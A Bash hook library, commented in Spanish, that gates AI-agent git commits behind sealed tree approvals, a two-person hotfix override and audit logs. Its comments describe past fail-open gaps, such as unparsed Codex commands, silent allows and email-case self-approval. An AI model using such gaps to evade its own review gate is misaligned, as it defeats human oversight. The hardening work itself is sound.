# Devuelve 2 (y no 1) cuando el flag existe pero apunta a otro arbol, para que el
# caller pueda distinguir "falta correr los gates" de "el codigo cambio despues
# de correrlos". Son problemas distintos y piden mensajes distintos.
dod_flag_covers() {
    local flag="$1" tree="$2"
    [[ -f "$flag" ]] || return 1
    dod_flag_fresh "$flag" || return 1
    [[ -n "$tree" ]] || return 1
    # El flag es una LISTA de arboles aprobados, uno por linea, no un valor unico.
    #
    # Con un solo valor, dos sesiones sobre el mismo repo se pisaban: si B corria
    # sus gates, A quedaba bloqueada sin entender por que. No era un agujero de
    # seguridad —el anclaje ya impedia que B usara el approval de A para otro
    # contenido— pero si un bloqueo mutuo. Una lista deja convivir los approvals
    # de cada arbol sin que uno invalide al otro.
    grep -qx "$tree" "$flag" 2>/dev/null && return 0
    # Hay contenido pero ninguna linea cubre este arbol. Un flag vacio (formato
    # viejo, un `touch` pelado) no dice que reviso: cuenta como ausente.
    [[ -s "$flag" ]] || return 1
    # 40 a 64: en repos SHA-256 un arbol son 64 hex. Con `{40}` fijo, la funcion
    # devolvia "falta el flag" donde debia decir "cubre OTRO contenido" — el
    # mensaje mandaba a correr los gates en vez de explicar que el arbol cambio.
    # Hex en los dos casos: `_dod_seal` acepta `[0-9a-fA-F]` al escribir, y aca se
    # exigia minuscula. Un flag con hex uppercase se clasificaba "falta el flag"
    # en vez de "cubre otro contenido", y el mensaje mandaba a correr los gates
    # cuando el problema era que el arbol habia cambiado.
    grep -qE '^[0-9a-fA-F]{40,64}$' "$flag" 2>/dev/null || return 1
    return 2
}

# Anota un arbol aprobado sin pisar los que ya estaban.
# Devuelve 0 si el sello quedo escrito, no-0 si NO se pudo.
#
# `dod_con_lock` ahora puede devolver 75 (no se consiguio exclusion y la
# operacion NO se ejecuto). Ignorar ese rc reintroduce exactamente el
# silenciamiento que la auditoria vino a quitar: el llamador cree que sello, el
# flag no existe, y la entrega se bloquea sin explicacion. El rc se propaga y los
# llamadores lo miran.
dod_flag_seal() {
    local flag="$1" tree="$2" max="${3:-20}"
    # EL ARBOL TIENE QUE PARECER UN ARBOL. Este archivo concede entregas: cada
    # linea suya es un contenido que el gate va a dejar pasar sin pedir review.
    # Solo se validaba que no estuviera vacio, asi que un valor con saltos de
    # linea escribia VARIAS lineas y pre-aprobaba arboles arbitrarios de una.
    #
    # Hoy el valor sale de `git write-tree` y no es alcanzable desde
    # `sellar-gate.sh`, pero una funcion que reparte aprobaciones no deberia
    # confiar en que la llamen bien. 40 a 64 hex: el mismo patron que usan el
    # trailer y `bin/ses.mjs`, para que los tres acepten lo mismo.
    [[ "$tree" =~ ^[0-9a-fA-F]{40,64}$ ]] || {
        printf '[DoD] sello rechazado: %.40q no es un hash de arbol.\n' "$tree" >&2
        return 1
    }
    mkdir -p "$(dirname "$flag")" 2>/dev/null
    # TODO el sellado va bajo el lock, append incluido.
    #
    # Dejar el `>>` afuera parecia inofensivo —`O_APPEND` hace atomica la
    # escritura de una linea— pero el riesgo no era la escritura sino la
    # convivencia: una liberacion concurrente lee el archivo, el append agrega
    # una linea, y el `mv` de la liberacion se la lleva. Medido: 16 de 20 sellos
    # perdidos bajo contencion. El lock y el mktemp ensancharon esa ventana de
    # microsegundos a milisegundos, asi que lo teorico paso a ser lo habitual.
    local rc
    dod_con_lock "$flag" _dod_seal "$flag" "$tree" "$max"; rc=$?
    if [[ $rc -ne 0 ]]; then
        printf '[DoD] el sello de %s NO quedo registrado (rc=%s). El gate va a seguir pidiendolo.\n' \
            "$(basename "$flag")" "$rc" >&2
        return "$rc"
    fi
}

_dod_seal() {
    local flag="$1" tree="$2" max="$3"
    # Mismo idioma que `_dod_release`: `grep` devuelve 0 (encontro), 1 (no
    # encontro) y >=2 (ERROR). El `||` disparaba para 1 y para >=2 por igual, asi
    # que sobre un flag ilegible se intentaba escribir igual y el motivo real se
    # perdia. No era fail-open —la verificacion final lo atrapaba— pero el dev se
    # quedaba sin saber por que.
    local _rc_seal
    # El archivo AUSENTE no es un error: es el primer sello. `grep` sobre un
    # archivo que no existe devuelve 2, igual que sobre uno ilegible, asi que
    # distinguirlos por el rc de grep trataba el caso normal como fallo y el
    # sellado no creaba el flag nunca. Se pregunta primero si existe.
    if [[ -f "$flag" ]]; then
        grep -qx "$tree" "$flag" 2>/dev/null; _rc_seal=$?
        [[ $_rc_seal -gt 1 ]] && return 1
    else
        _rc_seal=1
    fi
    # Y el `&&` sin `return 0` hacia que la funcion devolviera 1 cuando el arbol
    # YA estaba sellado — o sea, el caso idempotente se reportaba como fallo.
    if [[ $_rc_seal -eq 1 ]]; then
        printf '%s\n' "$tree" >> "$flag" || return 1
    fi
    # Techo: el archivo no puede crecer sin limite en una sesion larga.
    if [[ -f "$flag" && $(wc -l < "$flag" 2>/dev/null || echo 0) -gt "$max" ]]; then
        _dod_truncar "$flag" "$max"
    fi
    # La verificacion positiva vive ACA, bajo el mismo lock que el append.
    # Afuera, una liberacion concurrente —el `post-commit` de otra sesion
    # consumiendo el mismo arbol— podia llevarse la linea entre el append y el
    # chequeo, y el sellador reportaba "se ejecuto pero no quedo en el archivo":
    # un mensaje que suena a corrupcion para describir dos operaciones legitimas
    # que se cruzaron. Un aviso enganoso entrena al dev a ignorar los demas.
    grep -qx "$tree" "$flag" 2>/dev/null
}

# Mutex portable: `mkdir` es atomico en POSIX y no necesita flock, que en macOS
# no viene por defecto. Sin esto, dos procesos reescribiendo el mismo archivo con
# un temporal de nombre fijo se pisan — y el modo de falla no es "se perdio una
# linea" sino "desaparecio el archivo", porque uno evalua el temporal del otro,
# concluye que quedo vacio y borra approvals que seguian siendo validos.
# Log propio y no el de entregas: ese tiene formato fijo de 3 campos y lo parsea
# `dod_registro_base`, asi que una linea ajena se leeria como un sha muerto y
# gastaria presupuesto de barrido — reintroduciendo por la puerta de atras el
# costo que costo arreglar en M-12.
#
# UNICO log de la DoD SIN rotacion, y es deliberado: no lo "arregles" por
# simetria con dod_log_hotfix o gate-deliveries.log. Solo escribe en el camino de
# rendicion del lock, que ademas se auto-cura —el que se rinde hace `rmdir`, asi
# que un lock trabado no genera una linea por entrega para siempre— y cada evento
# cuesta 2 s de espera real. Llegar a 1 MB pide ~7.800 degradaciones, o sea horas
# de contencion acumulada. Si copias este patron a una ruta mas caliente, ahi si
# necesita rotacion.
DOD_LOCK_LOG="${DOD_LOCK_LOG:-logs/dod-lock-degradado.log}"

dod_log_lock_degradado() {
    local recurso="$1" archivo
    archivo="${CLAUDE_PROJECT_DIR:-.}/${DOD_LOCK_LOG}"
    mkdir -p "$(dirname "$archivo")" 2>/dev/null
    # No alcanza con `$$`: en bash devuelve el PID del shell INVOCANTE, asi que
    # todas las operaciones lanzadas como subshells desde el mismo shell se
    # registran con el mismo pid. Este log existe para diagnosticar contencion, y
    # diagnosticar contencion pide distinguir a los participantes — justo el caso
    # donde `$$` se aplana.
    #
    # `$BASHPID` lo resuelve, pero llego en bash 4.0 y macOS trae 3.2, que es
    # donde corre buena parte del stack. El `exec sh -c 'echo $PPID'` da el PID
    # del subshell actual en cualquiera de las dos. Cuesta dos procesos, y solo
    # se paga en el camino de rendicion del lock, que es raro por diseno.
    #
    # El `exec` NO es cosmetico: hace que `sh` REEMPLACE al subshell de la
    # sustitucion, asi que su `$PPID` es el proceso llamante — el que queremos.
    # Sin `exec`, `sh` seria hijo de ese subshell y `$PPID` devolveria el pid
    # efimero de la sustitucion, que no sirve para nada. Sacarlo "para ahorrar un
    # fork" deja el campo indiagnosticable en silencio.
    local pid="${BASHPID:-}"
    [[ -n "$pid" ]] || pid=$(exec sh -c 'echo $PPID')
    printf '%s pid=%s recurso=%s sin-exclusion\n' \
        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$pid" "$recurso" >> "$archivo" 2>/dev/null
}

# Segundos tras los cuales un lock se considera HUERFANO (proceso muerto sin
# limpiar). Las operaciones que protege son de milisegundos, asi que 5s ya es
# tres ordenes de magnitud de margen. Mas bajo arriesgaria robarle el lock a un
# proceso vivo en una maquina cargada — que produce justo la corrupcion que esto
# viene a evitar. Configurable para los tests, que no pueden esperar 5s.
DOD_LOCK_HUERFANO_SEG="${DOD_LOCK_HUERFANO_SEG:-5}"
# Techo duro. Si ni con la toma de huerfanos se consigue, se ABANDONA la
# operacion — no se ejecuta sin exclusion.
DOD_LOCK_INTENTOS_MAX="${DOD_LOCK_INTENTOS_MAX:-300}"

# Edad en segundos de un archivo o directorio, o rc!=0 si no se puede
# determinar. Unico lector de mtime del archivo: ver el comentario de orden.
_dod_edad_seg() {
    local d="$1" ahora mt
    ahora=$(date +%s 2>/dev/null) || return 1

    # ORDEN GNU PRIMERO, y no es cosmetico.
    #
    # En GNU coreutils `stat -f` es `--file-system`: NO falla, devuelve rc=0 y
    # imprime el punto de montaje. Con el orden inverso el `||` nunca dispara, la
    # aritmetica recibe `/` y revienta, `edad` queda vacia, y la toma de lock
    # huerfano queda MUERTA en Linux — que es donde corre CI, BAS y Cloud Foundry.
    # El resultado seria un cuelgue de 30s y rc=75 en cada commit con un lock
    # huerfano, en la plataforma donde nadie lo probaria a mano.
    #
    # Este repo ya habia tropezado con el mismo `stat -f` en `dod_log_hotfix`
    # (ver el comentario de `wc -c`). Se repitio el bug; el orden lo cierra.
    mt=$(stat -c %Y "$d" 2>/dev/null) || mt=$(stat -f %m "$d" 2>/dev/null) || return 1
    # Solo un entero es utilizable: cualquier otra cosa (un punto de montaje, un
    # mensaje) se descarta en vez de romper la aritmetica.
    case "$mt" in
        ''|*[!0-9]*) return 1 ;;
        *) ;;   # Un entero: utilizable.
    esac
    printf '%s' "$((ahora - mt))"
}

dod_con_lock() {
    local recurso="$1"; shift
    local lock="${recurso}.lock" intentos=0
    while ! mkdir "$lock" 2>/dev/null; do
        intentos=$((intentos + 1))

        # AUDITORIA A5. Antes, tras ~20 intentos (~2s) se ejecutaba la operacion
        # SIN exclusion. El comentario decia que el peor caso "vuelve a ser el de
        # antes", pero el de antes era perder sellos: medido en el smoketest,
        # 2 a 3 de 20 approvals concurrentes desaparecian, porque una liberacion
        # lee el archivo, un append agrega una linea, y el `mv` de la liberacion
        # se la lleva. Un approval que se gano y se pierde es exactamente el
        # error que no se puede silenciar.
        #
        # La preocupacion original —no colgar una entrega por un lock huerfano—
        # sigue siendo valida, y se resuelve TOMANDO el huerfano en vez de
        # ignorando la exclusion.
        # EL TECHO SE EVALUA PRIMERO. Iba despues de la rama del huerfano, que
        # hacia `rmdir` y `continue` — y si el `rmdir` fallaba, el bucle giraba
        # sin techo y SIN sleep. Medido: colgado indefinidamente, 2505 vueltas en
        # 45 s y 313 KB en `dod-lock-degradado.log`, que es el unico log sin
        # rotacion justamente porque se asumia que sus eventos cuestan segundos.
        # Un `PreToolUse` colgado sin una linea de salida es el peor modo de
        # falla de este aparato: el dev no sabe si el commit ocurrio.
        #
        # El `rmdir` falla por causas de todos los dias: un `.DS_Store` adentro,
        # el silly-rename de NFS (`.nfs*`), un antivirus, o el directorio padre
        # sin permiso de escritura.
        if [[ "$intentos" -gt "$DOD_LOCK_INTENTOS_MAX" ]]; then
            # Rastro en un LOG, no solo en stderr.
            #
            # El unico invocador automatico de la liberacion es .husky/post-commit,
            # que manda todo a /dev/null — y con razon, no debe ensuciar la salida
            # del commit. O sea que un aviso por stderr queda encendido en la ruta
            # interactiva, que ya es observable, y apagado en la automatica, que es
            # la que nadie mira. Mismo principio que quedo tras el bug del
            # SessionStart: lo que toca el estado de un gate deja rastro donde
            # nadie lo pueda redirigir.
            # No se ejecuta la operacion. Devolver un error es lo unico honesto:
            # el llamador tiene que saber que su sello NO quedo registrado.
            dod_log_lock_degradado "$recurso"
            printf '[DoD] no se pudo tomar el lock de %s tras %s intentos: la operacion NO se ejecuto.\n' \
                "$(basename "$recurso")" "$intentos" >&2
            return 75
        fi

        local edad
        edad=$(_dod_edad_seg "$lock" 2>/dev/null || echo '')
        if [[ -n "$edad" && "$edad" -ge "$DOD_LOCK_HUERFANO_SEG" ]]; then
            # El aviso y el log van UNA vez por lock Y POR PROCESO, no una por
            # vuelta: si el borrado no prospera, el bucle sigue intentando y
            # antes escribia una linea cada pocos milisegundos. Como este proceso
            # es un hook de vida corta, "por proceso" y "por incidencia" son lo
            # mismo en la practica; el registro en `dod-lock-degradado.log` queda
            # igual para la auditoria.
            if [[ "${_DOD_HUERFANO_AVISADO:-}" != "$lock" ]]; then
                _DOD_HUERFANO_AVISADO="$lock"
                dod_log_lock_degradado "$recurso"
                printf '[DoD] lock huerfano de %ss sobre %s: se toma.\n' \
                    "$edad" "$(basename "$recurso")" >&2
            fi
            # `rm -rf` y no `rmdir`: un lock con algo adentro no es una razon
            # para colgar la entrega.
            rm -rf "$lock" 2>/dev/null
        fi
        # Aviso de progreso mientras se espera. Con el techo por defecto (300
        # intentos) la espera maxima son ~30 s, y el unico invocador automatico
        # de la liberacion es `.husky/post-commit`, que manda todo a /dev/null:
        # con un lock irremovible el dev veia `git commit` tardar 40 segundos sin
        # una sola linea que lo explicara. El techo bajo el cuelgue de
        # "indefinido" a "40 s"; esto lo vuelve observable.
        if (( intentos % 50 == 0 )); then
            printf '[DoD] esperando el lock de %s (%ss)...\n' \
                "$(basename "$recurso")" "$(( intentos / 10 ))" >&2
        fi
        sleep 0.1
    done
    "$@"
    local rc=$?
    rmdir "$lock" 2>/dev/null
    return $rc
}

_dod_truncar() {
    local flag="$1" max="$2" tmp
    tmp=$(mktemp "${flag}.XXXXXX") || return 1
    tail -n "$max" "$flag" > "$tmp" 2>/dev/null && mv "$tmp" "$flag" || rm -f "$tmp"
}

_dod_release() {
    local flag="$1" tree="$2" tmp rc
    tmp=$(mktemp "${flag}.XXXXXX") || return 1
    # `grep` distingue tres cosas: 0 encontro, 1 no encontro, >=2 ERROR. El `||`
    # anterior metia el error en la misma bolsa que el "no encontro" y truncaba el
    # temporal; el `-s` daba falso y se borraba el flag ENTERO. O sea: un error de
    # IO transitorio en la sesion A tiraba a la basura los approvals sellados por
    # la sesion B. El lock protege de la concurrencia, no del filesystem.
    grep -vx "$tree" "$flag" > "$tmp" 2>/dev/null; rc=$?
    if [[ $rc -gt 1 ]]; then rm -f "$tmp"; return 1; fi
    if [[ -s "$tmp" ]]; then mv "$tmp" "$flag"; else rm -f "$tmp" "$flag"; fi
}

# Saca un arbol del flag. Si no queda ninguno, borra el archivo.
dod_flag_release() {
    local flag="$1" tree="$2"
    [[ -f "$flag" ]] || return 0
    if [[ -n "$tree" ]]; then
        dod_con_lock "$flag" _dod_release "$flag" "$tree"
    else
        rm -f "$flag"
    fi
}

# Archivos que trajo el ultimo commit. En el commit raiz no hay con que comparar.
dod_commit_files() {
    if git rev-parse --verify --quiet HEAD~1 >/dev/null 2>&1; then
        git -c core.quotePath=false diff --name-only HEAD~1 HEAD 2>/dev/null | grep -E "$DOD_PRODUCTIVE_RE" | sed '/^$/d'
    else
        git -c core.quotePath=false ls-tree -r --name-only HEAD 2>/dev/null | grep -E "$DOD_PRODUCTIVE_RE" | sed '/^$/d'
    fi
}

# El comando que la herramienta va a ejecutar, sea cual sea el host.
#
# Cada host nombra distinto el mismo dato: Claude Code usa `tool_input.command`,
# Codex usa `tool_input.cmd` para `exec_command`, y algunos mandan `argv` como
# lista. Leer solo `command` —que es lo que hacia `delivery-gate.sh`— devolvia
# vacio en Codex, el gate no veia ningun `git commit` y PERMITIA la entrega.
#
# La lista es la misma que `lib/hook-contract.mjs` usa para `ses guard`. Si un
# host suma otra clave se agrega ACA y en el contrato, no en cada script.
# Extrae el comando real del JSON del hook.
#
# Dependia SOLO de python3. Sin el devolvia "", el llamador caia al JSON crudo, y
# ahi el matcher NO enganchaba —en el JSON a `git` lo precede una comilla, no un
# espacio— asi que el gate salia 0, sin imprimir nada, PERMITIENDO la entrega. El
# comentario del llamador prometia justo lo contrario ("degradar a revisar de mas
# es preferible a dejar pasar una entrega sin gates"): la promesa estaba escrita,
# el codigo hacia lo opuesto.
#
# node va primero como respaldo porque es la dependencia que este stack SI puede
# dar por sentada —sin node no corre `bin/ses.mjs`, o sea nada— mientras que
# python3 no: el propio ADR-012 apunta a entornos de toolchain flaca.
dod_tool_command() {
    local entrada="$1" cmd=""
    if command -v python3 >/dev/null 2>&1; then
        cmd=$(printf '%s' "$entrada" | python3 -c "
import json,sys
try:
    i = json.load(sys.stdin).get('tool_input') or {}
    v = i.get('command') or i.get('cmd') or i.get('argv') or ''
    print(' '.join(v) if isinstance(v, list) else v)
except Exception:
    print('')" 2>/dev/null)
    fi
    if [[ -z "$cmd" ]] && command -v node >/dev/null 2>&1; then
        cmd=$(printf '%s' "$entrada" | node -e '
let s = "";
process.stdin.on("data", (d) => { s += d; }).on("end", () => {
  try {
    const i = JSON.parse(s).tool_input || {};
    const v = i.command || i.cmd || i.argv || "";
    process.stdout.write(Array.isArray(v) ? v.join(" ") : String(v));
  } catch { process.stdout.write(""); }
});' 2>/dev/null)
    fi
    printf '%s' "$cmd"
}

# 0 (true) si el flag existe y es mas reciente que DOD_MAX_AGE_SECONDS.
dod_flag_fresh() {
    local f="$1"
    [[ -f "$f" ]] || return 1

    # `_dod_edad_seg` y no `stat` a mano. La version previa hacia
    # `stat -f %m || stat -c %Y`, con el orden invertido respecto de la leccion
    # que este mismo archivo documenta 100 lineas mas arriba: en GNU coreutils
    # `stat -f` es `--file-system`, devuelve rc=0 e imprime el punto de montaje,
    # asi que el `||` nunca disparaba. `mtime` quedaba `/`, la aritmetica
    # reventaba, `age` quedaba VACIA — y `[[ "" -le 1800 ]]` es VERDADERO en
    # bash. En Linux (CI, BAS, Cloud Foundry) la red de vencimiento por tiempo
    # respondia "fresco" siempre, para cualquier flag por viejo que fuera.
    #
    # El anclaje al arbol (ADR-011) seguia sosteniendo el control principal, asi
    # que el agujero era el vencimiento, no el approval. Igual se cierra: una
    # red que siempre dice que si no es una red.
    local age
    age=$(_dod_edad_seg "$f") || return 1   # No verificable no es fresco.
    [[ -n "$age" ]] || return 1
    [[ "$age" -le "$DOD_MAX_AGE_SECONDS" ]]
}

# Estado del HOTFIX-OVERRIDE (two-person rule, ADR-005).
# Imprime: "ok|<approver>|<reason>" | "invalid" | "none"
dod_hotfix_state() {
    local flag="${1:-${CLAUDE_PROJECT_DIR:-.}/tmp/.hotfix-override}"
    [[ -f "$flag" ]] || { echo "none"; return 0; }

    local reason_line approver requester
    # `tr -d '\r'` igual que `approver`: el comentario de abajo dice haber cerrado
    # el caso CRLF y lo cerraba para UNO de los dos campos.
    reason_line=$(grep -E '^REASON: ' "$flag" 2>/dev/null | head -1 | tr -d '\r' \
        | sed -E 's/[[:space:]]*$//')
    # `tr -d '\r'` + trim final: sin eso, `APPROVED_BY: alice@corp.com ` (un
    # espacio) o un archivo con CRLF NO coincidian con `git config user.email` y
    # el self-approval pasaba. Un override de una sola persona es justo lo que
    # ADR-005 existe para impedir, y el valor sucio contaminaba tambien el log de
    # auditoria. Es el mismo CRLF que este cambio arreglo para `SES-Gated-Tree`.
    approver=$(grep -E '^APPROVED_BY:' "$flag" 2>/dev/null | head -1 | tr -d '\r' \
        | sed -E 's/^APPROVED_BY:[[:space:]]*//; s/[[:space:]]*$//')
    requester=$(git config user.email 2>/dev/null || echo "unknown")

    if ! echo "$reason_line" | grep -qE '^REASON: .{20,}'; then echo "invalid"; return 0; fi
    # Comparacion en minusculas: los emails son case-insensitive por RFC 5321, y
    # `Alice@Corp.com` aprobandose a si misma como `alice@corp.com` pasaba el
    # control de two-person rule.
    local ap_lc rq_lc
    ap_lc=$(printf '%s' "$approver"  | tr '[:upper:]' '[:lower:]')
    rq_lc=$(printf '%s' "$requester" | tr '[:upper:]' '[:lower:]')
    if [[ -z "$approver" || "$ap_lc" == "$rq_lc" ]]; then echo "invalid"; return 0; fi
    echo "ok|${approver}|${reason_line#REASON: }"
}

# Registra un uso de HOTFIX-OVERRIDE en logs/hotfix-overrides.log, rotando el
# archivo si supera 1MB (se mantienen 3 generaciones).
# AUDITORIA A12 — `SES_GATES=off` desactivaba el gate de entrega y NO dejaba
# rastro en ningun log, mientras `hotfix-override` —que es mas restrictivo,
# exige two-person rule y se consume— si se audita. La via mas facil de omitir
# los gates era la unica invisible.
#
# No bloquea: el punto no es impedirlo (es una decision legitima del dev) sino
# que quede constancia de que se tomo, sobre que contenido y por quien.
#
# Uso: dod_log_gates_off <log_file> <arbol> <archivos>
dod_log_gates_off() {
    local log="$1" arbol="$2" archivos="$3"
    # Si no se puede escribir el log, se DICE. Un `|| return 0` aca hacia que el
    # llamador anunciara "Registrado en logs/gates-off.log" sobre un archivo que
    # nunca se escribio — el unico caso que este log existe para evitar.
    if ! mkdir -p "$(dirname "$log")" 2>/dev/null; then
        printf '[DoD] no se pudo crear %s: el uso de SES_GATES=off NO quedo registrado.\n' \
            "$(dirname "$log")" >&2
        return 1
    fi

    if [[ -f "$log" ]]; then
        local size; size=$(wc -c < "$log" 2>/dev/null | tr -d ' ')
        if [[ "${size:-0}" -gt 1048576 ]]; then
            [[ -f "${log}.2" ]] && mv "${log}.2" "${log}.3"
            [[ -f "${log}.1" ]] && mv "${log}.1" "${log}.2"
            mv "$log" "${log}.1"
        fi
    fi

    local n; n=$(printf '%s\n' "$archivos" | sed '/^$/d' | wc -l | tr -d ' ')
    printf '[%s] user=%s session=%s tree=%s archivos=%s — SES_GATES=off\n%s\n' \
        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
        "$(git config user.email 2>/dev/null || echo unknown)" \
        "${CLAUDE_SESSION_ID:-no-session}" \
        "${arbol:0:12}" "$n" \
        "$(printf '%s\n' "$archivos" | sed '/^$/d' | sed 's/^/    /')" >> "$log" || {
        printf '[DoD] no se pudo escribir %s: el uso de SES_GATES=off NO quedo registrado.\n' \
            "$log" >&2
        return 1
    }
}

# Uso: dod_log_hotfix <log_file> <requester> <approver> <reason>
dod_log_hotfix() {
    local log="$1" requester="$2" approver="$3" reason="$4"
    # Falla CERRADO, igual que `dod_log_gates_off`. Antes era `|| return 0`: si no
    # se podia crear el directorio, la funcion devolvia EXITO y el llamador
    # anunciaba el override como auditado. ADR-005 pide que todo override quede
    # registrado; un override consumido sin constancia es justo lo que la regla
    # de dos personas existe para impedir.
    mkdir -p "$(dirname "$log")" 2>/dev/null || {
        echo "[DoD] no se pudo crear $(dirname "$log"): el HOTFIX-OVERRIDE NO queda auditado." >&2
        return 1
    }

    # `wc -c` y no `stat -f %z`: en GNU coreutils `-f` es `--file-system` y
    # devuelve el block size, con lo que la rotacion nunca se disparaba.
    if [[ -f "$log" ]]; then
        local size; size=$(wc -c < "$log" 2>/dev/null | tr -d ' ')
        if [[ "${size:-0}" -gt 1048576 ]]; then
            [[ -f "${log}.2" ]] && mv "${log}.2" "${log}.3"
            [[ -f "${log}.1" ]] && mv "${log}.1" "${log}.2"
            mv "$log" "${log}.1"
        fi
    fi

    printf '[%s] user=%s approver=%s session=%s — REASON: %s\n' \
        "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$requester" "$approver" \
        "${CLAUDE_SESSION_ID:-no-session}" "$reason" >> "$log" || {
        echo "[DoD] no se pudo escribir $log: el HOTFIX-OVERRIDE NO queda auditado." >&2
        return 1
    }
}

# Escapa un texto arbitrario como string JSON.
#
# La implementacion vive en `json-escape.sh`, compartida con
# `emit-stack-event.sh`: los dos arman JSON que otro proceso parsea, y los dos
# los sourcea el mismo gate. Tener la regla dos veces es como se desalinean.
#
# Se conserva el nombre `dod_json_escape` porque hay llamadores; es un alias fino
# sobre `ses_json_escape`, no una segunda copia.
dod_json_escape() {
    if declare -F ses_json_escape >/dev/null 2>&1; then
        ses_json_escape "$1"
        return
    fi
    # RESPALDO. Nunca puede fallar, y el motivo es concreto: `deny()` construye
    # su JSON con esta funcion. Cuando delegaba a secas y `json-escape.sh` no
    # estaba, salia rc=127, el `printf` del deny no imprimia nada, y un hook que
    # no imprime nada es un ALLOW. O sea que un archivo faltante convertia cada
    # denegacion en permiso, en silencio — peor que el bug que el lib arregla.
    # Lo encontraron 31 tests de push que pasaron de `deny` a `null`.
    #
    # No cubre los control chars raros como el del lib; cubre lo que aparece en
    # un mensaje de deny y garantiza JSON valido. Que el lib FALTE se denuncia
    # aparte, y fuerte, en `delivery-gate.sh`.
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    s="${s//$'\t'/\\t}"
    s="${s//$'\n'/\\n}"
    s="${s//$'\r'/\\r}"
    printf '"%s"' "$s"
}

